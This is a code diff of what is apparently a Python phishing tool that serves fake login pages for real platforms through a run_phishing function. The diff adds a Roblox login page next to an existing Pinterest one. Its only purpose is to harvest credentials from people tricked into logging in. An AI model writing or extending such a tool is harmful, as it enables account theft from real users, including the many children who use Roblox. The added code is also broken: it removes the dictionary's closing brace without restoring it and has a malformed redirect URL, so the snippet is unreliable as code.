@@ -166,7 +166,11 @@ platforms = {
         "placeholder": "Email or Username",
         "html": generate_html("Pinterest Login", "https://cdn-icons-png.flaticon.com/512/733/733646.png", "Email or Username")
     },
-}
+    "Roblox":{
+    "redirect": "https:://roblox.com",
+    "placeholder": "Email or Username",
+    "html": generate_html("Roblox Login", "https://share.google/vRrImIbRp41bgc34l", "Email or Username")
+    }
 
 def run_phishing(platform_data, port, platform_name):
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
@@ -227,3 +231,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
